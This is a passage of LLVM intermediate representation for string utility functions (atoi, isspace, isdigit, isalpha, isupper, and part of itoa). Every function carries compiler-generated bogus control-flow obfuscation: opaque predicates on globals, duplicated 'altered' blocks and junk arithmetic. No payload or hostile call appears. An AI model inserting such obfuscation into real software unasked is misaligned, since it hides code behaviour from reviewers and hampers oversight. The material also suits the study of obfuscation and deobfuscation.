  %_1 = sub i32 0, %63
  %gen = add i32 %_1, -1
  %_2 = sub i32 %63, -1
  %gen3 = mul i32 %_2, -1
  %_4 = sub i32 %63, -1
  %gen5 = mul i32 %_4, -1
  %64 = add nsw i32 %63, -1
  store i32 %64, i32* %4, align 4
  %65 = icmp ne i32 %63, 0
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %27
  %66 = load i8*, i8** %5, align 8
  %67 = getelementptr inbounds i8, i8* %66, i32 1
  store i8* %67, i8** %5, align 8
  store i8 0, i8* %66, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %46
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_atoi(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

; <label>:11:                                     ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21

; <label>:21:                                     ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

; <label>:24:                                     ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %54

; <label>:29:                                     ; preds = %21
  %30 = load i32, i32* @x.61
  %31 = load i32, i32* @y.62
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* %6, align 4
  %39 = icmp eq i32 %38, 43
  %40 = load i32, i32* @x.61
  %41 = load i32, i32* @y.62
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %39, label %48, label %53

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = load i8*, i8** %3, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %3, align 8
  %51 = load i8, i8* %49, align 1
  %52 = sext i8 %51 to i32
  store i32 %52, i32* %6, align 4
  br label %53

; <label>:53:                                     ; preds = %48, %originalBBpart2
  br label %54

; <label>:54:                                     ; preds = %53, %24
  %55 = load i32, i32* @x.61
  %56 = load i32, i32* @y.62
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* %8, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %65, i64* %7, align 8
  %66 = load i64, i64* %7, align 8
  %67 = load i32, i32* %4, align 4
  %68 = sext i32 %67 to i64
  %69 = urem i64 %66, %68
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %10, align 4
  %71 = load i32, i32* %4, align 4
  %72 = sext i32 %71 to i64
  %73 = load i64, i64* %7, align 8
  %74 = udiv i64 %73, %72
  store i64 %74, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  %75 = load i32, i32* @x.61
  %76 = load i32, i32* @y.62
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart211, label %originalBB1alteredBB

originalBBpart211:                                ; preds = %originalBB1
  br label %83

; <label>:83:                                     ; preds = %185, %originalBBpart211
  %84 = load i32, i32* @x.61
  %85 = load i32, i32* @y.62
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %83
  %92 = load i32, i32* %6, align 4
  %93 = trunc i32 %92 to i8
  %94 = call i32 @util_isdigit(i8 signext %93)
  %95 = icmp ne i32 %94, 0
  %96 = load i32, i32* @x.61
  %97 = load i32, i32* @y.62
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %95, label %104, label %107

; <label>:104:                                    ; preds = %originalBBpart215
  %105 = load i32, i32* %6, align 4
  %106 = sub nsw i32 %105, 48
  store i32 %106, i32* %6, align 4
  br label %138

; <label>:107:                                    ; preds = %originalBBpart215
  %108 = load i32, i32* %6, align 4
  %109 = trunc i32 %108 to i8
  %110 = call i32 @util_isalpha(i8 signext %109)
  %111 = icmp ne i32 %110, 0
  br i1 %111, label %112, label %120

; <label>:112:                                    ; preds = %107
  %113 = load i32, i32* %6, align 4
  %114 = trunc i32 %113 to i8
  %115 = call i32 @util_isupper(i8 signext %114)
  %116 = icmp ne i32 %115, 0
  %117 = select i1 %116, i32 55, i32 87
  %118 = load i32, i32* %6, align 4
  %119 = sub nsw i32 %118, %117
  store i32 %119, i32* %6, align 4
  br label %121

; <label>:120:                                    ; preds = %107
  br label %190

; <label>:121:                                    ; preds = %112
  %122 = load i32, i32* @x.61
  %123 = load i32, i32* @y.62
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %121
  %130 = load i32, i32* @x.61
  %131 = load i32, i32* @y.62
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %138

; <label>:138:                                    ; preds = %originalBBpart219, %104
  %139 = load i32, i32* %6, align 4
  %140 = load i32, i32* %4, align 4
  %141 = icmp sge i32 %139, %140
  br i1 %141, label %142, label %143

; <label>:142:                                    ; preds = %138
  br label %190

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* %9, align 4
  %145 = icmp slt i32 %144, 0
  br i1 %145, label %158, label %146

; <label>:146:                                    ; preds = %143
  %147 = load i64, i64* %5, align 8
  %148 = load i64, i64* %7, align 8
  %149 = icmp ugt i64 %147, %148
  br i1 %149, label %158, label %150

; <label>:150:                                    ; preds = %146
  %151 = load i64, i64* %5, align 8
  %152 = load i64, i64* %7, align 8
  %153 = icmp eq i64 %151, %152
  br i1 %153, label %154, label %159

; <label>:154:                                    ; preds = %150
  %155 = load i32, i32* %6, align 4
  %156 = load i32, i32* %10, align 4
  %157 = icmp sgt i32 %155, %156
  br i1 %157, label %158, label %159

; <label>:158:                                    ; preds = %154, %146, %143
  store i32 -1, i32* %9, align 4
  br label %168

; <label>:159:                                    ; preds = %154, %150
  store i32 1, i32* %9, align 4
  %160 = load i32, i32* %4, align 4
  %161 = sext i32 %160 to i64
  %162 = load i64, i64* %5, align 8
  %163 = mul i64 %162, %161
  store i64 %163, i64* %5, align 8
  %164 = load i32, i32* %6, align 4
  %165 = sext i32 %164 to i64
  %166 = load i64, i64* %5, align 8
  %167 = add i64 %166, %165
  store i64 %167, i64* %5, align 8
  br label %168

; <label>:168:                                    ; preds = %159, %158
  %169 = load i32, i32* @x.61
  %170 = load i32, i32* @y.62
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %168
  %177 = load i32, i32* @x.61
  %178 = load i32, i32* @y.62
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %185

; <label>:185:                                    ; preds = %originalBBpart223
  %186 = load i8*, i8** %3, align 8
  %187 = getelementptr inbounds i8, i8* %186, i32 1
  store i8* %187, i8** %3, align 8
  %188 = load i8, i8* %186, align 1
  %189 = sext i8 %188 to i32
  store i32 %189, i32* %6, align 4
  br label %83

; <label>:190:                                    ; preds = %142, %120
  %191 = load i32, i32* @x.61
  %192 = load i32, i32* @y.62
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %190
  %199 = load i32, i32* %9, align 4
  %200 = icmp slt i32 %199, 0
  %201 = load i32, i32* @x.61
  %202 = load i32, i32* @y.62
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %200, label %209, label %213

; <label>:209:                                    ; preds = %originalBBpart227
  %210 = load i32, i32* %8, align 4
  %211 = icmp ne i32 %210, 0
  %212 = select i1 %211, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %212, i64* %5, align 8
  br label %236

; <label>:213:                                    ; preds = %originalBBpart227
  %214 = load i32, i32* %8, align 4
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %216, label %235

; <label>:216:                                    ; preds = %213
  %217 = load i32, i32* @x.61
  %218 = load i32, i32* @y.62
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %216
  %225 = load i64, i64* %5, align 8
  %226 = sub i64 0, %225
  store i64 %226, i64* %5, align 8
  %227 = load i32, i32* @x.61
  %228 = load i32, i32* @y.62
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart233, label %originalBB29alteredBB

originalBBpart233:                                ; preds = %originalBB29
  br label %235

; <label>:235:                                    ; preds = %originalBBpart233, %213
  br label %236

; <label>:236:                                    ; preds = %235, %209
  %237 = load i32, i32* @x.61
  %238 = load i32, i32* @y.62
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %236
  %245 = load i64, i64* %5, align 8
  %246 = trunc i64 %245 to i32
  %247 = load i32, i32* @x.61
  %248 = load i32, i32* @y.62
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  ret i32 %246

originalBBalteredBB:                              ; preds = %originalBB, %29
  %255 = load i32, i32* %6, align 4
  %256 = icmp eq i32 %255, 43
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %257 = load i32, i32* %8, align 4
  %258 = icmp ne i32 %257, 0
  %259 = select i1 %258, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %259, i64* %7, align 8
  %260 = load i64, i64* %7, align 8
  %261 = load i32, i32* %4, align 4
  %262 = sext i32 %261 to i64
  %_ = sub i64 %260, %262
  %gen = mul i64 %_, %262
  %_2 = sub i64 0, %260
  %gen3 = add i64 %_2, %262
  %_4 = sub i64 0, %260
  %gen5 = add i64 %_4, %262
  %_6 = shl i64 %260, %262
  %_7 = shl i64 %260, %262
  %_8 = sub i64 %260, %262
  %gen9 = mul i64 %_8, %262
  %263 = urem i64 %260, %262
  %264 = trunc i64 %263 to i32
  store i32 %264, i32* %10, align 4
  %265 = load i32, i32* %4, align 4
  %266 = sext i32 %265 to i64
  %267 = load i64, i64* %7, align 8
  %268 = udiv i64 %267, %266
  store i64 %268, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB13alteredBB:                            ; preds = %originalBB13, %83
  %269 = load i32, i32* %6, align 4
  %270 = trunc i32 %269 to i8
  %271 = call i32 @util_isdigit(i8 signext %270)
  %272 = icmp ne i32 %271, 0
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %121
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %168
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %190
  %273 = load i32, i32* %9, align 4
  %274 = icmp slt i32 %273, 0
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %216
  %275 = load i64, i64* %5, align 8
  %_30 = sub i64 0, %275
  %gen31 = mul i64 %_30, %275
  %276 = sub i64 0, %275
  store i64 %276, i64* %5, align 8
  br label %originalBB29

originalBB35alteredBB:                            ; preds = %originalBB35, %236
  %277 = load i64, i64* %5, align 8
  %278 = trunc i64 %277 to i32
  br label %originalBB35
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isspace(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %34, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %34, label %10

; <label>:10:                                     ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %34, label %14

; <label>:14:                                     ; preds = %10
  %15 = load i32, i32* @x.63
  %16 = load i32, i32* @y.64
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i8, i8* %2, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 10
  %26 = load i32, i32* @x.63
  %27 = load i32, i32* @y.64
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2, %10, %6, %1
  %35 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %25, %originalBBpart2 ]
  %36 = zext i1 %35 to i32
  ret i32 %36

originalBBalteredBB:                              ; preds = %originalBB, %14
  %37 = load i8, i8* %2, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp eq i32 %38, 10
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isdigit(i8 signext) #0 {
  %2 = load i32, i32* @x.65
  %3 = load i32, i32* @y.66
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  store i8 %0, i8* %10, align 1
  %11 = load i8, i8* %10, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 48
  %14 = load i32, i32* @x.65
  %15 = load i32, i32* @y.66
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %26

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i8, i8* %10, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp sle i32 %24, 57
  br label %26

; <label>:26:                                     ; preds = %22, %originalBBpart2
  %27 = phi i1 [ false, %originalBBpart2 ], [ %25, %22 ]
  %28 = zext i1 %27 to i32
  ret i32 %28

originalBBalteredBB:                              ; preds = %originalBB, %1
  %29 = alloca i8, align 1
  store i8 %0, i8* %29, align 1
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp sge i32 %31, 48
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isalpha(i8 signext) #0 {
  %2 = load i32, i32* @x.67
  %3 = load i32, i32* @y.68
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  store i8 %0, i8* %10, align 1
  %11 = load i8, i8* %10, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 65
  %14 = load i32, i32* @x.67
  %15 = load i32, i32* @y.68
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %26

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i8, i8* %10, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp sle i32 %24, 90
  br i1 %25, label %36, label %26

; <label>:26:                                     ; preds = %22, %originalBBpart2
  %27 = load i8, i8* %10, align 1
  %28 = sext i8 %27 to i32
  %29 = icmp sge i32 %28, 97
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* %10, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp sle i32 %32, 122
  br label %34

; <label>:34:                                     ; preds = %30, %26
  %35 = phi i1 [ false, %26 ], [ %33, %30 ]
  br label %36

; <label>:36:                                     ; preds = %34, %22
  %37 = phi i1 [ true, %22 ], [ %35, %34 ]
  %38 = load i32, i32* @x.67
  %39 = load i32, i32* @y.68
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  %46 = zext i1 %37 to i32
  %47 = load i32, i32* @x.67
  %48 = load i32, i32* @y.68
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %46

originalBBalteredBB:                              ; preds = %originalBB, %1
  %55 = alloca i8, align 1
  store i8 %0, i8* %55, align 1
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp sge i32 %57, 65
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  %59 = zext i1 %37 to i32
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isupper(i8 signext) #0 {
  %2 = load i32, i32* @x.69
  %3 = load i32, i32* @y.70
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  store i8 %0, i8* %10, align 1
  %11 = load i8, i8* %10, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 65
  %14 = load i32, i32* @x.69
  %15 = load i32, i32* @y.70
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %26

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i8, i8* %10, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp sle i32 %24, 90
  br label %26

; <label>:26:                                     ; preds = %22, %originalBBpart2
  %27 = phi i1 [ false, %originalBBpart2 ], [ %25, %22 ]
  %28 = zext i1 %27 to i32
  ret i32 %28

originalBBalteredBB:                              ; preds = %originalBB, %1
  %29 = alloca i8, align 1
  store i8 %0, i8* %29, align 1
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp sge i32 %31, 65
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) #0 {
  %4 = load i32, i32* @x.71
  %5 = load i32, i32* @y.72
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca [34 x i8], align 16
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i32 %1, i32* %14, align 4
  store i8* %2, i8** %15, align 8
  %21 = load i8*, i8** %15, align 8
  %22 = icmp eq i8* %21, null
  %23 = load i32, i32* @x.71
  %24 = load i32, i32* @y.72
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %48

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.71
  %33 = load i32, i32* @y.72
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i8* null, i8** %12, align 8
  %40 = load i32, i32* @x.71
  %41 = load i32, i32* @y.72
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %225

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = load i32, i32* %13, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %202

; <label>:51:                                     ; preds = %48
  store i32 32, i32* %18, align 4
  %52 = getelementptr inbounds [34 x i8], [34 x i8]* %16, i64 0, i64 33
  store i8 0, i8* %52, align 1
  %53 = load i32, i32* %14, align 4
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %55, label %61

; <label>:55:                                     ; preds = %51
  %56 = load i32, i32* %13, align 4
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %55
  store i32 1, i32* %17, align 4
  %59 = load i32, i32* %13, align 4
  %60 = sub nsw i32 0, %59
  store i32 %60, i32* %20, align 4
  br label %79

; <label>:61:                                     ; preds = %55, %51
  %62 = load i32, i32* @x.71
  %63 = load i32, i32* @y.72
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  store i32 0, i32* %17, align 4
  %70 = load i32, i32* %13, align 4
  store i32 %70, i32* %20, align 4
  %71 = load i32, i32* @x.71
  %72 = load i32, i32* @y.72
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %79

; <label>:79:                                     ; preds = %originalBBpart28, %58
  br label %80

; <label>:80:                                     ; preds = %originalBBpart241, %79
  %81 = load i32, i32* @x.71
  %82 = load i32, i32* @y.72
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %80
  %89 = load i32, i32* %20, align 4
  %90 = icmp ne i32 %89, 0
  %91 = load i32, i32* @x.71
  %92 = load i32, i32* @y.72
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %90, label %99, label %170

; <label>:99:                                     ; preds = %originalBBpart212
  %100 = load i32, i32* @x.71
  %101 = load i32, i32* @y.72
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %99
  %108 = load i32, i32* %20, align 4
  %109 = load i32, i32* %14, align 4
  %110 = urem i32 %108, %109
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp slt i32 %111, 10
  %113 = load i32, i32* @x.71
  %114 = load i32, i32* @y.72
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart218, label %originalBB14alteredBB

originalBBpart218:                                ; preds = %originalBB14
  br i1 %112, label %121, label %140

; <label>:121:                                    ; preds = %originalBBpart218
  %122 = load i32, i32* @x.71
  %123 = load i32, i32* @y.72
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
